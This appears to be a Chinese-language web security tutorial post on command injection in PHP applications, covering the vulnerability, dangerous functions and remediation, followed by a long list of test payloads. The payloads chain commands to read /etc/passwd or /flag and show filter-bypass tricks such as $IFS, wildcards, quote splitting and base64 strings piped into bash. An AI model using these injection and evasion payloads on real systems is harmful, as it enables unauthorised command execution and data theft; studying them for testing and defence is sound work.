---
author: YOUZAI
title: 命令执行漏洞
date: 2023/04/25
categories:
 - 常见漏洞
tags:
 - WEB安全
---

## 漏洞原理

最早称为命令注入攻击（Command Injection），是指由于 web 应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至 Web 应用程序中，并利用该方式执行外部程序或系统命令实施攻击非法获取数据或网络资源等。

### PHP命令执行函数

* `system` => 用来执行一个外部的应用程序并将相应的执行结果输出。
* `passthru` => 函数可以用来执行一个 UNIX 系统命令并显示原始的输出。
* `exec` => 用来执行一个外部的应用程序。
* `eval` => 函数会将参数字符串作为 **PHP 程序代码来执行**，将 php 代码保存成字符串的形式，然后传递给 eval 函数执行。

### PHP代码执行函数

|函数名|
|:-|
|`eval()`|
|`assert()`|
|`preg_replace()`|
|`create_function()`|
|`call_user_func()`|
|`call_user_func_array()`|

## 漏洞危害

* 执行恶意命令，危害服务器。
* 可能使服务器被恶意攻击者控制。

## 修复建议

* 严格过滤用户输入的数据，禁止执行系统命令。
* 使用动态函数之前，确保使用的函数是指定函数。
* 在执行命令函数，对参数进行过滤，并对敏感字符进行转义。
* 使用函数替换命令执行，并且参数值尽量使用引号包括。

## 测试方法

使用 `&` `&&` `|` `||`

```shell
ping www.baidu.com & cat /etc/passwd # &：命令后台执行。
ping www.baidu.com && cat /etc/passwd # &&：第一条命令执行成功后，才会执行后一条命令。
ping www.baidu.com | cat /etc/passwd # |：第一条命令的输出作为后一条命令的输入。
ping www.baidu.com || cat /etc/passwd # ||：第一条命令执行失败后，才会执行后一条命令。
```

* 使用`;`

```shell
ping www.baidu.com;cat /etc/passwd
```

* 使用`{}`

```shell
{cat,/etc/passwd}
```

* 使用命令拼接

```shell
a=c;b=at;c=/etc;d=/passwd;$a$b $c$d$e
```

* 使用`<>`

```shell
cat<>/etc/passwd
```

* 使用`\`

```shell
ca\t /et\c/passwd
```

* 使用特殊变量

```shell
ca$@t /et$@c/passwd
ca$1t /et$2c/passwd
```

* 使用模式匹配

```shell
cat t[a-z]st
cat t{a,b,c,d,e,f}st
```

* 使用单双引号

```shell
c""at fl''ag.tx""t
```

* 使用反引号

```shell
cat `ls` # 单引号包裹的是命令
```

* 使用编码

```shell
echo "Y2F0IC9mbGFn"|base64 -d|bash ==> cat /etc/passwd
echo Y2F0IC9mbGFn|base64 -d|sh ==> cat /etc/passwd
```

* 使用 *oct* 字节

```shell
$(printf "\154\163") ==> ls
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==> cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==> cat /flag
```

* 使用通配符`? *`

```shell
cat /flag => cat /?lag => /???/?at /?lag => /???/?[a][t] /?"?"?"?
```

* 使用`more` `less`

```sh
more /etc/passwd
less /etc/passwd
```

* 空格绕过

```shell
cat</flag
cat<>/flag
cat${IFS}/flag
cat$IFS$9/flag
```

* 使用 `\`，主要绕过命令输入的长度限制

```shell
echo "cat\\" >> cmd
sh cmd
```